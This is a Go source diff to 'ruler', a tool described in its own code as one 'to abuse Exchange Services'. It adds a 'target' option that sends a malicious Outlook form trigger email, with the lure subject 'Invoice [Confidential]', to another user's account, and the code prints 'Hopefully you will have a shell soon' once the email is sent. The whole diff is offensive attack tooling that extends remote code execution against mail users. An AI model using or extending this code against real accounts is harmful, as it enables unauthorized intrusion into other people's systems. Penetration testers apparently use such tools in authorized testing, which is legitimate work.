@@ -521,6 +521,7 @@ func triggerForm(c *cli.Context) error {
 	body := c.String("body")
 	suffix := c.String("suffix")
 	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
+	target := c.GlobalString("email")
 
 	utils.Trace.Println("Creating Trigger message.")
 	msgid, err := forms.CreateFormTriggerMessage(suffix, subject, body)
@@ -528,7 +529,12 @@ func triggerForm(c *cli.Context) error {
 		return err
 	}
 	utils.Info.Println("Sending email.")
-	if _, err = mapi.SendExistingMessage(folderid, msgid, c.GlobalString("email")); err != nil {
+	//send to another account
+	if c.String("target") != "" {
+		target = c.String("target")
+	}
+
+	if _, err = mapi.SendExistingMessage(folderid, msgid, target); err != nil {
 		return err
 	}
 	utils.Info.Println("Email sent! Hopefully you will have a shell soon.")
@@ -562,7 +568,7 @@ func main() {
 	app := cli.NewApp()
 	app.Name = "ruler"
 	app.Usage = "A tool to abuse Exchange Services"
-	app.Version = "2.0.17"
+	app.Version = "2.1.0"
 	app.Author = "Etienne Stalmans <etienne@sensepost.com>, @_staaldraad"
 	app.Description = `         _
  _ __ _   _| | ___ _ __
@@ -962,6 +968,11 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 							Name:  "subject",
 							Value: "Invoice [Confidential]",
 							Usage: "The subject you wish to use, this should contain your trigger word.",
+						},
+						cli.StringFlag{
+							Name:  "target",
+							Value: "",
+							Usage: "Send the email to another account.",
 						},
 					},
 					Action: func(c *cli.Context) error {
